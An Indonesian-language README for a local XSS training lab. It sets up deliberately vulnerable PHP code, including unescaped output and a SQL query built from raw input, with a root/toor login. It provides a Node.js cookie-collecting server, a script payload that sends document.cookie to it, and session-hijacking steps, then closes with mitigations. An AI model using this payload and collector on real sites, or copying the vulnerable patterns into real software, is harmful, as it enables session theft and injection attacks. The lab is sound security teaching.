# Simulasi Keamanan Web: Eksperimen XSS (Stored & Reflected)
---

<br>

## 📚 Daftar Isi

1. [Tujuan](#tujuan)
2. [Kebutuhan Sistem](#kebutuhan-sistem)
3. [Struktur Direktori Proyek](#struktur-direktori-proyek)
4. [Database Setup](#database-setup-via-phpmyadmin)
5. [Penjelasan File](#penjelasan-file)
6. [Langkah Simulasi Serangan](#langkah-simulasi-serangan)
7. [Hasil Serangan](#hasil-serangan)
8. [Mitigasi (Pencegahan)](#mitigasi-pencegahan)

---

## Tujuan

Eksperimen ini dirancang untuk:

- Memahami bagaimana XSS bekerja, khususnya tipe **Stored** dan **Reflected**.
- Menunjukkan bagaimana skrip jahat dapat disimpan dan dijalankan di browser korban.
- Mengenal teknik pencegahan seperti sanitasi input dan penggunaan encoding/output escaping.

---

<br>

## Kebutuhan Sistem

| Komponen   | Fungsi                                                    |
|------------|-----------------------------------------------------------|
| XAMPP      | Menyediakan Apache Web Server dan MySQL secara lokal       |
| Node.js    | Menjalankan server eksternal (trap.js) untuk mencuri cookie korban |
| Browser    | Digunakan untuk mengakses antarmuka web dan memantau hasil serangan |
| Editor     | Untuk menulis dan mengedit kode (VS Code, Notepad++, dll) |

---

<br>

## Struktur Direktori Proyek

```
xss_lab/
├── includes/       # Koneksi database
│   └── config.php
├── auth/           # Modul login dan logout
│   ├── signin.php
│   └── signout.php
├── comments/       # Form komentar dan tampilan komentar
│   ├── post.php
│   ├── save.php
│   └── display.php
├── assets/         # CSS atau gambar (opsional)
│   └── main.css
├── server/         # Server Node.js untuk mencuri cookie
│   └── trap.js
├── index.php       # (opsional) redirect ke login
├── home.php        # Dashboard setelah login
└── README.txt      # Dokumentasi eksperimen
```

---

<br>

## Database Setup (via phpMyAdmin)

1. Buka `http://localhost/phpmyadmin`.
2. Buat database baru bernama: `lab_xss`.
3. Jalankan SQL berikut:

```sql
CREATE TABLE users (
  id INT PRIMARY KEY AUTO_INCREMENT,
  uname VARCHAR(50),
  upass VARCHAR(255)
);

CREATE TABLE feedback (
  id INT PRIMARY KEY AUTO_INCREMENT,
  uname VARCHAR(50),
  message TEXT
);

INSERT INTO users (uname, upass) VALUES ('root', 'toor');
```

---

<br>

## Penjelasan File

### **auth/signin.php**
Melakukan login dan pembuatan session. Jika berhasil, diarahkan ke `home.php`.

### **home.php**
Halaman utama (dashboard). Menampilkan tautan ke komentar dan logout. Proteksi dengan session.

### **comments/post.php**
Form komentar untuk pengguna. Data dikirim ke `save.php`.

### **comments/save.php**
Menyimpan komentar langsung ke database tanpa validasi:
```php
$conn->query("INSERT INTO feedback (uname, message) VALUES ('$uname', '$message')");
```

### **comments/display.php**
Menampilkan komentar dari database tanpa filter output, memicu Stored XSS:
```php
echo "<strong>{$row['uname']}</strong>: {$row['message']}<hr>";
```

### **includes/config.php**
Koneksi MySQL:
```php
$conn = new mysqli("localhost", "root", "", "lab_xss");
if ($conn->connect_error) {
    die("DB Error");
}
```

### **server/trap.js**
Server Node.js untuk mencuri cookie korban:
```js
const http = require("http");
const fs = require("fs");

http.createServer((req, res) => {
    const url = require('url').parse(req.url, true);
    if (url.pathname === "/grab") {
        const stolen = `COOKIE: ${url.query.data}\n`;
        fs.appendFileSync("loot.txt", stolen);
        res.end("Captured");
    } else {
        res.end("Inactive");
    }
}).listen(1444, () => {
    console.log("Trap active on http://localhost:1444");
});
```

---

<br>

## Langkah Simulasi Serangan

### Persiapan
1. Jalankan Apache dan MySQL dari XAMPP.
2. Jalankan Node.js server:
   ```bash
   cd server
   node trap.js
   ```

### Login
1. Akses: `http://localhost/xss_lab/auth/signin.php`.
2. Login:
   - **Username**: root
   - **Password**: toor

### Kirim Komentar Jahat
1. Akses `http://localhost/xss_lab/comments/post.php` dan kirim komentar berikut:
   ```html
   <script>
     fetch("http://localhost:1444/grab?data=" + document.cookie)
   </script>
   ```

### Jalankan Serangan
1. Admin membuka halaman `comments/display.php`.
2. Skrip `<script>` dijalankan oleh browser admin.
3. Cookie terkirim ke `trap.js`.
4. Cookie tersimpan di file `server/loot.txt`.

---

<br>

## Hasil Serangan

### **File loot.txt**
Akan berisi:
```
COOKIE: PHPSESSID=abcd1234xyz...
```

### **Gunakan Cookie untuk Session Hijacking**
1. Buka tab Incognito.
2. Akses: `http://localhost/xss_lab/auth/signin.php`.
3. Tekan `F12` → **Application** → **Cookies**.
4. Tambahkan:
   - **Name**: PHPSESSID
   - **Value**: dari `loot.txt`.
5. Akses `home.php`. Jika cookie valid, akan langsung masuk sebagai admin.

---

<br>

## Mitigasi (Pencegahan)

### **Escaping Output**
```php
echo htmlspecialchars($row['message'], ENT_QUOTES, 'UTF-8');
```

### **Validasi & Sanitasi Input**
Gunakan pustaka seperti **HTMLPurifier** atau `filter_var()`.

### **Header HTTP**
Tambahkan di awal skrip:
```php
header("Content-Security-Policy: default-src 'self'");
```

### **Gunakan Framework Modern**
Framework seperti **Laravel**, **Symfony**, **Django**, dan **Spring** secara otomatis menangani escaping dan filtering XSS.